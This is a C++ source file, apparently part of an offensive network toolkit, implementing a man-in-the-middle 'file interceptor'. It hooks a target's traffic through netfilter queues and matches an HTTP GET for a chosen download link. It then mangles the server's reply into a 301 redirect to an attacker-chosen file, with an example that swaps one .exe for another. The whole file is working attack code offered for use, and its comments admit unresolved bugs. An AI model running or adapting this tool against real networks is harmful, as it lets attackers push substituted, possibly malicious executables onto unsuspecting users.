#include "FileInterceptor.h"

#include <iostream>

#include <arpa/inet.h> 
#include <netinet/ip.h>
#include <net/if.h>
#include <netinet/in.h>
#include <unistd.h>
#include <cstring>
#include <linux/netfilter.h>
#include <netinet/ip6.h>
void PrintHelp(char** argv)
{
    std::cout
        << "To use the program, provide the arguments in the following format:\n"
        << argv[0] << " <interface name> <ip version> <target ip> <download link> <new download link>\n\n"
        << "<interface name>: the interface you wish to use.\n"
        << "<ip version>: ip version of the target, must be 4 or 6\n"
        << "<target ip>: target whose file you wish to intercept\n"
        << "<download link>: file you wish to replace\n"
        << "<new download link>: the path to the file you want the target to download\n\n"
        << "Example: " << argv[0] << " eth0 "<< "4 " << "10.0.2.4 " << " download.example.co/testfile.exe" << "10.0.2.15/test_program.exe" << std::endl;
}

// TODO: improve args processing
int ProcessArgs(int argc, char** argv, char* interfaceName, uint32_t& ipVersion, char* targetIP, char* downloadLink, char* newDownloadLink)
{
    if((argc == 2) && (PacketCraft::CompareStr(argv[1], "?") == TRUE))
    {
        PrintHelp(argv);
        exit(EXIT_SUCCESS);
    }

    if(argc != 6)
        return APPLICATION_ERROR;

    if(PacketCraft::GetStrLen(argv[1]) > IFNAMSIZ)
        return APPLICATION_ERROR;

    PacketCraft::CopyStr(interfaceName, IFNAMSIZ, argv[1]);

    if(PacketCraft::CompareStr(argv[2], "4") == TRUE)
        ipVersion = AF_INET;
    else if(PacketCraft::CompareStr(argv[2], "6") == TRUE)
        ipVersion = AF_INET6;
    else
        return APPLICATION_ERROR;

    PacketCraft::CopyStr(targetIP, INET6_ADDRSTRLEN, argv[3]);
    PacketCraft::CopyStr(downloadLink, DOWNLOAD_LINK_STR_SIZE, argv[4]);
    PacketCraft::CopyStr(newDownloadLink, DOWNLOAD_LINK_STR_SIZE, argv[5]);

    return NO_ERROR;
}

bool32 FilterRequest(const char* downloadLink, tcphdr* tcpHeader, char* payload, uint32_t& reqAckNum)
{
    uint32_t res = PacketCraft::GetTCPDataProtocol((TCPHeader*)tcpHeader); // TODO: is this a safe cast?
    if(res == PC_HTTP_REQUEST)
    {
        if(PacketCraft::GetHTTPMethod((uint8_t*)payload) == PC_HTTP_GET)
        {
            char packetFileName[255]{};
            char packetDomainName[255]{};
            char packetDownloadLink[1024]{};

            char buffer[255]{};

            // Copy the first line of the http request in buffer. Should be something like this: "GET /test/file.php HTTP/1.1"
            PacketCraft::CopyStrUntil(buffer, sizeof(buffer), payload, '\n');

            int filePathStartIndex = 4;
            int filePathEndIndex = PacketCraft::FindInStr(buffer, " HTTP");
            memcpy(packetFileName, buffer + filePathStartIndex, filePathEndIndex - filePathStartIndex);
            memset(buffer, '\0', sizeof(buffer));
            packetFileName[filePathEndIndex] = '\0';

            // Copy the line containing the host domain name in buffer. Should be something like this: "Host: example.test.com"
            // TODO: Host may be written in capital letters! Need to add support for that!
            PacketCraft::CopyStrUntil(buffer, sizeof(buffer), payload + PacketCraft::FindInStr(payload, "Host: "), '\n');

            int domainStartIndex = 6;
            int domainEndIndex = PacketCraft::FindInStr(buffer, "\r\n");
            memcpy(packetDomainName, buffer + domainStartIndex, domainEndIndex - domainStartIndex);
            memset(buffer, '\0', sizeof(buffer));
            packetDomainName[domainEndIndex] = '\0';

            PacketCraft::ConcatStr(packetDownloadLink, sizeof(packetDownloadLink), packetDomainName, packetFileName);

            if(PacketCraft::CompareStr(packetDownloadLink, downloadLink) == TRUE)
            {
                reqAckNum = tcpHeader->ack_seq;
                return TRUE;
            }
        }
    }

    return FALSE;
}

bool32 FilterResponse(tcphdr* tcpHeader, char* payload, uint32_t requestAckNum)
{
    uint32_t res = PacketCraft::GetTCPDataProtocol((TCPHeader*)tcpHeader); // TODO: is this a safe cast?
    if(res == PC_HTTP_RESPONSE)
    {
        if(PacketCraft::GetHTTPMethod((uint8_t*)payload) == PC_HTTP_SUCCESS)
        {
            // response matching the original request found
            if(tcpHeader->seq == requestAckNum)
                return TRUE;
        }
    }

    return FALSE;
}

int CreateResponsePayload(char* buffer, size_t bufferLen, const char* newDownloadLink)
{
    const char* httpStatusCode = "HTTP/1.1 301 Moved Permanently\r\nLocation: ";
    uint32_t responseCodeLen = PacketCraft::GetStrLen(httpStatusCode) + PacketCraft::GetStrLen(newDownloadLink) + 1;
    PacketCraft::ConcatStr(buffer, responseCodeLen, httpStatusCode, newDownloadLink);
    return NO_ERROR;
}

bool32 requestFiltered{FALSE};
uint32_t requestAckNum{0};

static int netfilterCallback(struct nfq_q_handle *queue, struct nfgenmsg *nfmsg, struct nfq_data *nfad, void *data)
{
    CHaks::NetFilterCallbackData callbackData = *(CHaks::NetFilterCallbackData*)data;

    nfqnl_msg_packet_hdr* ph = nfq_get_msg_packet_hdr(nfad);
    if(ph == nullptr)
    {
        LOG_ERROR(APPLICATION_ERROR, "nfq_get_msg_packet_hdr() error");
        return -1;
    }

    unsigned char* rawData = nullptr;
    int len = nfq_get_payload(nfad, &rawData);
    if(len < 0)
    {
        LOG_ERROR(APPLICATION_ERROR, "nfq_get_payload() error");
        return -1;
    }

    std::cout << "packet received: id: " << ntohl(ph->packet_id) << ", bytes: " << len << " hw proto: " << ntohs(ph->hw_protocol) << std::endl;

    pkt_buff* pkBuff = pktb_alloc(callbackData.ipVersion, rawData, len, 0);
    if(pkBuff == nullptr)
    {
        pktb_free(pkBuff);
        LOG_ERROR(APPLICATION_ERROR, "pktb_alloc() error");
        return -1;
    }

    uint32_t ethProto = ntohs(ph->hw_protocol);
    iphdr* ipv4Header{nullptr};
    ip6_hdr* ipv6Header{nullptr};
    tcphdr* tcpHeader{nullptr};
    bool32 hasTCPLayer{FALSE};


    if(ethProto == ETH_P_IP)
    {
        ipv4Header = nfq_ip_get_hdr(pkBuff);
        if(ipv4Header == nullptr)
        {
            pktb_free(pkBuff);
            LOG_ERROR(APPLICATION_ERROR, "pktb_network_header() error");
            return -1;
        }

        if(nfq_ip_set_transport_header(pkBuff, ipv4Header) < 0)
        {
            pktb_free(pkBuff);
            LOG_ERROR(APPLICATION_ERROR, "nfq_ip_set_transport_header() error");
            return -1;
        }

        if(ipv4Header->protocol == IPPROTO_TCP)
            hasTCPLayer = TRUE;

        // make sure that the packet IPs matches with the desired target IP
        if(requestFiltered == FALSE)
        {
            sockaddr_in targetAddr{};
            inet_pton(AF_INET, callbackData.targetIPStr, &targetAddr.sin_addr);
            if(targetAddr.sin_addr.s_addr != ipv4Header->saddr)
                return nfq_set_verdict(queue, ntohl(ph->packet_id), NF_ACCEPT, 0, nullptr); 
        }
        else
        {
            sockaddr_in targetAddr{};
            inet_pton(AF_INET, callbackData.targetIPStr, &targetAddr.sin_addr);
            if(targetAddr.sin_addr.s_addr != ipv4Header->daddr)
                return nfq_set_verdict(queue, ntohl(ph->packet_id), NF_ACCEPT, 0, nullptr);
        }
        //////////////////////////
    }
    else if(ethProto == ETH_P_IPV6)
    {
        ipv6Header = nfq_ip6_get_hdr(pkBuff);
        if(ipv6Header == nullptr)
        {
            pktb_free(pkBuff);
            LOG_ERROR(APPLICATION_ERROR, "pktb_network_header()");
            return -1;
        }

        int res = nfq_ip6_set_transport_header(pkBuff, ipv6Header, IPPROTO_TCP);
        if(res == 1)
        {
            hasTCPLayer = TRUE;
        }
        else if(res < 0)
        {
            pktb_free(pkBuff);
            LOG_ERROR(APPLICATION_ERROR, "nfq_ip6_set_transport_header()");
            return -1;
        }

        // make sure that the packet IPs matches with the desired target IP
        if(requestFiltered == FALSE)
        {
            sockaddr_in6 targetAddr{};
            inet_pton(AF_INET6, callbackData.targetIPStr, &targetAddr.sin6_addr);
            if(memcmp(targetAddr.sin6_addr.__in6_u.__u6_addr8, ipv6Header->ip6_src.__in6_u.__u6_addr8, IPV6_ALEN) != 0)
                return nfq_set_verdict(queue, ntohl(ph->packet_id), NF_ACCEPT, 0, nullptr);  
        }
        else
        {
            sockaddr_in6 targetAddr{};
            inet_pton(AF_INET6, callbackData.targetIPStr, &targetAddr.sin6_addr);  
            if(memcmp(targetAddr.sin6_addr.__in6_u.__u6_addr8, ipv6Header->ip6_dst.__in6_u.__u6_addr8, IPV6_ALEN) != 0)
                return nfq_set_verdict(queue, ntohl(ph->packet_id), NF_ACCEPT, 0, nullptr); 
        }
        //////////////////////////
    }

    if(hasTCPLayer == TRUE)
    {
        tcpHeader = nfq_tcp_get_hdr(pkBuff);
        if(tcpHeader == nullptr)
        {
            pktb_free(pkBuff);
            LOG_ERROR(APPLICATION_ERROR, "nfq_tcp_get_hdr");
            return -1;
        }

        void *payload = nfq_tcp_get_payload(tcpHeader, pkBuff);
        if(payload == nullptr)
        {
            pktb_free(pkBuff);
            LOG_ERROR(APPLICATION_ERROR, "nfq_tcp_get_payload() error");
            return -1;
        }

        // payload len includes the header and options size, so we need to subtract those
        unsigned int payloadLen = nfq_tcp_get_payload_len(tcpHeader, pkBuff);
        payloadLen -= 4 * tcpHeader->th_off;

        std::cout << "payload len was " << payloadLen << std::endl;
        
        if(requestFiltered == FALSE) // filter for the correct request and get its ack number
        {
            std::cout << "filtering request...\n";
            if(FilterRequest(callbackData.downloadLink, tcpHeader, (char*)payload, requestAckNum) == TRUE)
            {
                std::cout << "request filtered\n";
                for(unsigned int i = 0; i < payloadLen; ++i)
                {
                    std::cout << ((char*)payload)[i];
                }
                std::cout << std::endl;

                requestFiltered = TRUE;
            }
        }
        else // filter for the correct response. the seq num must match the request ack num
        {
            std::cout << "filtering response...\n";
            if(FilterResponse(tcpHeader, (char*)payload, requestAckNum) == TRUE)
            {
                // NOTE IMPORTANT TODO: bug somewhere below this line because if we uncomment this return verdict, the packet will be
                // dropped as expected. However if we try to drop the packet after mangling, it will not be dropped.
                // Something goes wrong with the mangling process. Also we may need to do something about the 
                // ack/seq numbers when we edit the payload. Also there is a bug because some wierd stuff gets printed in the console. Possibly
                // something left over in a buffer.
                // return nfq_set_verdict(queue, ntohl(ph->packet_id), NF_DROP, pktb_len(pkBuff), pktb_data(pkBuff));

                std::cout << "response filtered\n";
                for(unsigned int i = 0; i < payloadLen; ++i)
                {
                    std::cout << ((char*)payload)[i];
                }
                std::cout << std::endl;

                char httpResponse[1024]{};
                CreateResponsePayload(httpResponse, 1024, callbackData.newDownloadLink);
                uint32_t newResponseLen = PacketCraft::GetStrLen(httpResponse);

                if(ethProto == ETH_P_IP)
                {
                    std::cout << "before mangling\n";
                    char ipStrBuf[PC_IPV4_MAX_STR_SIZE]{};
                    PacketCraft::ConvertIPv4LayerToString(ipStrBuf, PC_IPV4_MAX_STR_SIZE, (IPv4Header*)ipv4Header);
                    std::cout << ipStrBuf << std::endl;
                    memset(ipStrBuf, 0, PC_IPV4_MAX_STR_SIZE);

                    char tcpStrBuf[PC_TCP_MAX_STR_SIZE]{};
                    PacketCraft::ConvertTCPLayerToString(tcpStrBuf, PC_TCP_MAX_STR_SIZE, (TCPHeader*)tcpHeader);
                    std::cout << tcpStrBuf << std::endl;
                    memset(tcpStrBuf, 0, PC_TCP_MAX_STR_SIZE);

                    if(nfq_tcp_mangle_ipv4(pkBuff, 4 * tcpHeader->th_off, payloadLen, httpResponse, newResponseLen) < 0)
                    {
                        pktb_free(pkBuff);
                        requestFiltered = FALSE;
                        requestAckNum = 0;
                        LOG_ERROR(APPLICATION_ERROR, "nfq_tcp_mangle_ipv4() error");
                        return -1;
                    }

                    std::cout << "after mangling\n";
                    PacketCraft::ConvertIPv4LayerToString(ipStrBuf, PC_IPV4_MAX_STR_SIZE, (IPv4Header*)ipv4Header);
                    std::cout << ipStrBuf << std::endl;

                    PacketCraft::ConvertTCPLayerToString(tcpStrBuf, PC_TCP_MAX_STR_SIZE, (TCPHeader*)tcpHeader);
                    std::cout << tcpStrBuf << std::endl;
                }
                else if(ethProto == ETH_P_IPV6)
                {   
                    if(nfq_tcp_mangle_ipv6(pkBuff, 4 * tcpHeader->th_off, payloadLen, httpResponse, newResponseLen) < 0)
                    {
                        pktb_free(pkBuff);
                        requestFiltered = FALSE;
                        requestAckNum = 0;
                        LOG_ERROR(APPLICATION_ERROR, "nfq_ip6_mangle() error");
                        return -1;
                    }
                }   

                requestFiltered = FALSE;
                requestAckNum = 0;
                return nfq_set_verdict(queue, ntohl(ph->packet_id), NF_ACCEPT, pktb_len(pkBuff), pktb_data(pkBuff));
            }
        }
    }

    return nfq_set_verdict(queue, ntohl(ph->packet_id), NF_ACCEPT, 0, nullptr);
}

int main(int argc, char** argv)
{
    char interfaceName[IFNAMSIZ]{};
    uint32_t ipVersion{};
    char targetIPStr[INET6_ADDRSTRLEN]{};
    char downloadLink[DOWNLOAD_LINK_STR_SIZE]{};
    char newDownloadLink[DOWNLOAD_LINK_STR_SIZE]{};

    if(ProcessArgs(argc, argv, interfaceName, ipVersion, targetIPStr, downloadLink, newDownloadLink) == APPLICATION_ERROR)
    {
        LOG_ERROR(APPLICATION_ERROR, "ProcessArgs() error!");
        PrintHelp(argv);
        return APPLICATION_ERROR;
    }

    /*

    int socketFd = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ALL));

    CHaks::FileInterceptor fileInterceptor;

    if(fileInterceptor.Init(ipVersion) == APPLICATION_ERROR)
    {
        LOG_ERROR(APPLICATION_ERROR, "CHaks::FileInterceptor::Init() error");
        close(socketFd);
        return APPLICATION_ERROR;
    }

    if(fileInterceptor.Run(socketFd, interfaceName, targetIPStr, downloadLink, newDownloadLink) == APPLICATION_ERROR)
    {
        LOG_ERROR(APPLICATION_ERROR, "CHaks::FileInterceptor::Run() error");
        close(socketFd);
        return APPLICATION_ERROR;
    }


    close(socketFd);

    */

    CHaks::FileInterceptor fileInterceptor;
    if(fileInterceptor.Init(ipVersion, targetIPStr, downloadLink, newDownloadLink) == APPLICATION_ERROR)
    {
        LOG_ERROR(APPLICATION_ERROR, "CHaks::FileInterceptor::Init() error");
        return APPLICATION_ERROR;
    }

    if(fileInterceptor.Run2(netfilterCallback) == APPLICATION_ERROR)
    {
        LOG_ERROR(APPLICATION_ERROR, "CHaks::FileInterceptor::Run() error");
        return APPLICATION_ERROR;
    }

    std::cout << std::flush;
    return NO_ERROR;    
}